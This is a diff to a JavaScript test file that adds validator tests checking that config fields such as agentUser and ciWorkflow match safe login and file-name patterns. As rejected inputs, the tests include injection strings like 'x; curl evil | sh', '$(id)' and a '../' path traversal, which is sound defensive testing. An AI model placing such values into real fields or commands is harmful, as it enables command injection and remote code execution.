@@ -8,6 +8,8 @@ import {
 	validateConfig,
 	writeConfigSchema,
 } from '../../src/base/config-schema.js'
+import { LOGIN } from '../../src/base/agent-user.js'
+import { WORKFLOW_FILE } from '../../src/base/config.js'
 import { FixerAbort } from '../../src/base/fixer-abort.js'
 import { useTmpDir } from '../helpers/tmp-dir.js'
 
@@ -40,6 +42,28 @@ describe('validateConfig', () => {
 		expect(validateConfig({ quietStopMinutes: -1 })).toEqual([
 			'"quietStopMinutes" must be at least 0',
 		])
+	})
+
+	// #388: readConfig drops these silently, so the schema check is where they show.
+	it('names an agentUser, humanUser, ciWorkflow or checkCommand that fails its pattern', () => {
+		expect(validateConfig({ agentUser: 'x; curl evil | sh' })).toEqual([
+			`"agentUser" must match ${LOGIN.source}, got "x; curl evil | sh"`,
+		])
+		expect(validateConfig({ humanUser: '$(id)' })).toHaveLength(1)
+		expect(validateConfig({ ciWorkflow: '../ci.yml' })).toHaveLength(1)
+		expect(validateConfig({ checkCommand: 'echo `id`' })).toHaveLength(1)
+		expect(
+			validateConfig({ agentUser: 'bot', humanUser: 'acme-owner', ciWorkflow: 'ci.yml' })
+		).toEqual([])
+	})
+
+	it('keeps the schema patterns equal to the runtime regexes', () => {
+		const props = fs.readJsonSync(
+			join(import.meta.dirname, '../../schemas/repo-ai.json')
+		).properties
+		expect(props.agentUser.pattern).toBe(LOGIN.source)
+		expect(props.humanUser.pattern).toBe(LOGIN.source)
+		expect(props.ciWorkflow.pattern).toBe(WORKFLOW_FILE.source)
 	})
 })
 
